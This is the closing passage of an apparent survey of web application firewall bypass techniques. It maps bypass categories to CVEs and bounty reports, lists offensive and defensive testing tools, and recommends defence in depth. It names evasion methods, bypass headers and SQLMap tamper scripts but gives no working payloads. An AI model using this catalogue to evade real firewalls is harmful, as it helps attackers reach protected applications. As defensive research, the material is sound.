## §11. CVE / Bounty Mapping (2024–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §4-1 (Path Normalization) + §1-1 (Percent-Encoded Query Delimiter) | CVE-2024-1019 (ModSecurity 3.0.0–3.0.11) | CVSS 8.6. URL path payload hidden from WAF path rules via percent-encoded `?`. Patch: 3.0.12 |
| §3-1 (Chunk Extension Abuse) | CVE-2025-55315 (ASP.NET Core) | CVSS 9.9. HTTP request smuggling via chunk extensions, Microsoft's highest-severity ASP.NET Core CVE |
| §9-2 (Alternate Endpoint) + §3-2 (Header Manipulation) | CVE-2025-29927 (Next.js middleware bypass) | Authorization middleware bypass via `x-middleware-subrequest` header. Cloudflare WAF issued proactive rule |
| §9-1 (Origin IP Exposure) | BreakingWAF (Zafran, 2025) | Affects 40%+ of CDN/WAF-protected sites including JPMorganChase, Visa, Intel. Origin servers accept non-CDN traffic |
| §2 (Content-Type) + §2-3 (Multipart/Boundary) | WAFFLED (ACSAC 2025) | 1,207 bypasses across AWS WAF, Azure, Cloud Armor, Cloudflare, ModSecurity. 24 distinct categories |
| §2-1 (JSON SQL) | JS-ON: Security-OFF (Claroty, 2022–2023) | JSON-based SQLi bypassed Palo Alto, AWS, Cloudflare, F5, Imperva WAFs. All vendors patched |
| §1-1 (Double Encoding) + §6-2 (XSS Tag Diversity) | Imperva WAF XSS Bypass (2024 bounty) | Reflected XSS via incorrect URL encoding handling (`%5K` → `P` conversion). Private bounty program |
| §9-1 (Origin IP) | Cloudflare Origin IP Bypass (HackerOne #1536299) | WAF bypass by sending requests directly to origin IP |
| §1-1 (URL Encoding) + §4-1 (Path Confusion) | ModSecurity v2/v3 Path Confusion (SicuraNext, 2024) | Multiple path confusion bugs enabling rule bypass on both v2 and v3 branches |
| §7-1 (ReDoS) | Cloudflare Global Outage (2019) | WAF regex caused catastrophic backtracking, global service disruption. Led to migration to Rust regex engine |
| §8-2 (H2C Smuggling) | Azure WAF H2C Bypass (Assetnote) | Global WAF bypass via HTTP/2 cleartext upgrade. All subsequent requests bypass WAF |
| §3-2 (Header) + §5-1 (HPP) | WAFManis (Black Hat 2024) | 311 protocol-level evasion cases discovered across multiple WAFs |
| §1-1 (Encoding) + §6-1 (SQL Grammar) | CVE-2024-56524 (Radware Cloud WAF) | URL filter bypass in Radware's cloud WAF service |

---

## §12. Detection & Testing Tools

### Offensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **WAFFLED** (Fuzzer) | Parsing discrepancy detection across AWS, Azure, Cloud Armor, Cloudflare, ModSecurity | Content-type-specific fuzzing: mutates boundaries, charsets, namespaces, JSON structure |
| **WAFManis** (Framework) | Protocol-level WAF evasion testing | Systematic mutation of HTTP protocol features (headers, methods, encoding) |
| **SQLMap** (Scanner + Tamper Scripts) | SQL injection with WAF bypass | Tamper scripts: `randomcase`, `space2comment`, `charunicodeencode`, `between`, `equaltolike` |
| **WAF-A-MoLE** (OWASP, Fuzzer) | ML-based WAF evasion assessment | Guided mutation using adversarial ML; generates semantically equivalent SQLi variants |
| **WAFNinja** (CLI) | WAF rule discovery and bypass | Fuzzes allowed symbols/keywords, then sends bypass payloads from database |
| **WhatWaf** (Scanner) | WAF fingerprinting and bypass | Detects WAF vendor/version, attempts known bypasses from plugin database |
| **WAFW00F** (Fingerprinter) | WAF identification | Fingerprints 100+ WAF products via response analysis |
| **Burp Suite** (Extensions) | Comprehensive WAF testing | Request Smuggler (H2.TE/H2.CL), Hackvertor (encoding), Param Miner (hidden params) |
| **h2cSmuggler** (Bishop Fox) | H2C upgrade bypass testing | Automates HTTP/2 cleartext upgrade attack through reverse proxies |
| **http2smugl** (Scanner) | HTTP/2 request smuggling detection | Tests load balancers for HTTP/2 smuggling vulnerabilities |
| **Wafer** (Sysdig, Fuzzer) | Cloud WAF XSS testing | Based on PortSwigger XSS reference; tests tag/attribute/event handler combinations with Unicode mutations |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **HTTP Normalizer** (WAFFLED project) | RFC-compliant request normalization | Proxy that validates/normalizes HTTP requests against RFC standards; blocked all WAFFLED bypasses |
| **ModSecurity CRS** (OWASP) | Generic WAF rule set | Regex-based rules with paranoia levels; regularly updated for new bypass patterns |
| **Nemesida WAF Bypass** (GitHub) | WAF self-assessment | Tests WAF installations against known bypass techniques across categories |
| **Awesome-WAF** (0xInfection) | WAF research aggregation | Curated collection of WAF bypass research, payloads, and techniques from a security standpoint |

---

## §13. Summary: Core Principles

### The Fundamental Asymmetry

WAF bypass is possible because of an irreducible architectural asymmetry: the WAF must **shadow-parse** every request exactly as the backend would, yet it is **not the backend**. It runs different software, different parsers, different normalization logic, and often sits at a different protocol layer. Any discrepancy between the WAF's interpretation and the backend's interpretation — no matter how subtle — becomes a bypass vector.

This asymmetry manifests across every layer of the HTTP stack. At the encoding layer (§1), the WAF must decode every encoding scheme the backend supports. At the content parsing layer (§2), it must handle JSON, XML, multipart, and URL-encoded bodies with identical parsing semantics. At the protocol layer (§3, §8), it must correctly frame messages and handle protocol upgrades. At the path layer (§4), it must normalize URLs the same way the OS, web server, and application framework do. At the grammar layer (§6), it must understand every SQL dialect, JavaScript execution sink, and shell expansion mechanism. The 2025 WAFFLED research demonstrated this comprehensively: by fuzzing only the non-malicious components of requests (boundaries, charsets, namespaces) while keeping payloads constant, researchers found 1,207 bypasses across five major WAF vendors.

### Why Incremental Patches Fail

Each specific bypass can be patched — adding a JSON SQL rule, fixing a boundary parsing edge case, handling a new charset. But the attack surface is combinatorial: 9 mutation target categories × 7 discrepancy types × 10+ attack scenarios, with each category containing dozens of subtypes. The attacker needs to find *one* discrepancy; the WAF must eliminate *all* of them. Automated tools like WAF-A-MoLE and WAFFLED can generate thousands of novel bypass variants faster than rules can be written, and the 41-day average lag between CVE publication and WAF rule deployment (versus hours for exploit code) ensures a persistent window of exposure.

### The Structural Solution

The only comprehensive defense is defense-in-depth: (1) **strict RFC-compliant request normalization** at the edge (as demonstrated by the HTTP Normalizer tool), eliminating parsing discrepancies before they reach the WAF; (2) **parameterized queries, output encoding, and input validation at the application layer**, treating the WAF as a supplementary — not primary — defense; (3) **origin server network isolation**, ensuring the WAF cannot be architecturally bypassed; and (4) **migration to HTTP/2 end-to-end**, eliminating the protocol ambiguities that enable request smuggling. The WAF remains valuable as a probabilistic filter that raises the attacker's cost, but it should never be the sole line of defense against injection attacks.

---

## References

- WAFFLED: Exploiting Parsing Discrepancies to Bypass Web Application Firewalls (ACSAC 2025) — https://arxiv.org/html/2503.10846v1
- JS-ON: Security-OFF: Abusing JSON-Based SQL to Bypass WAF (Claroty Team82) — https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf
- BreakingWAF: Widespread WAF Bypass via Origin IP Exposure (Zafran, 2025) — https://www.zafran.io/resources/breaking-waf
- CVE-2024-1019: ModSecurity Path Normalization Bypass — https://nvd.nist.gov/vuln/detail/CVE-2024-1019
- ModSecurity Path Confusion Bugs (SicuraNext, 2024) — https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/
- H2C Smuggling in the Wild (Assetnote / Bishop Fox) — https://www.assetnote.io/resources/research/h2c-smuggling-in-the-wild
- WAF-A-MoLE: Evading Web Application Firewalls through Adversarial ML (OWASP) — https://owasp.org/www-project-waf-a-mole/
- WAFManis: Protocol-Level WAF Evasion Testing (Black Hat USA 2024) — presented by Ryan Kane & Rushank Shetty
- HTTP Request Smuggling Using Chunk Extensions — CVE-2025-55315 (F5 DevCentral) — https://community.f5.com/kb/security-insights/http-request-smuggling-using-chunk-extensions-cve-2025-55315/344118
- SQL Injection Bypassing WAF (OWASP) — https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
- WAF Bypassing with Unicode Compatibility (Jorge Lajara) — https://jlajara.gitlab.io/Bypass_WAF_Unicode
- Breaking Down Multipart Parsers: File Upload Validation Bypass (SicuraNext) — https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass/
- When WAFs Go Awry: Common Detection & Evasion Techniques (MDSec, 2024) — https://www.mdsec.co.uk/2024/10/when-wafs-go-awry-common-detection-evasion-techniques-for-web-application-firewalls/
- Awesome-WAF (0xInfection, GitHub) — https://github.com/0xInfection/Awesome-WAF
- 2026 WAF Security Test: Key Findings (Check Point) — https://blog.checkpoint.com/securing-the-cloud/waf-security-test-results-2026-why-prevention-first-matters-more-than-ever
- Miggo Research: More than Half of Public Vulnerabilities Bypass Leading WAFs (2025) — https://www.helpnetsecurity.com/2025/12/18/miggo-research-waf-vulnerability-bypass/
- BWAFSQLi: Adversarial SQLi-Based WAF Bypass Framework (ACM, 2025) — https://dl.acm.org/doi/pdf/10.1145/3788286

---

*This document was created for defensive security research and vulnerability understanding purposes.*
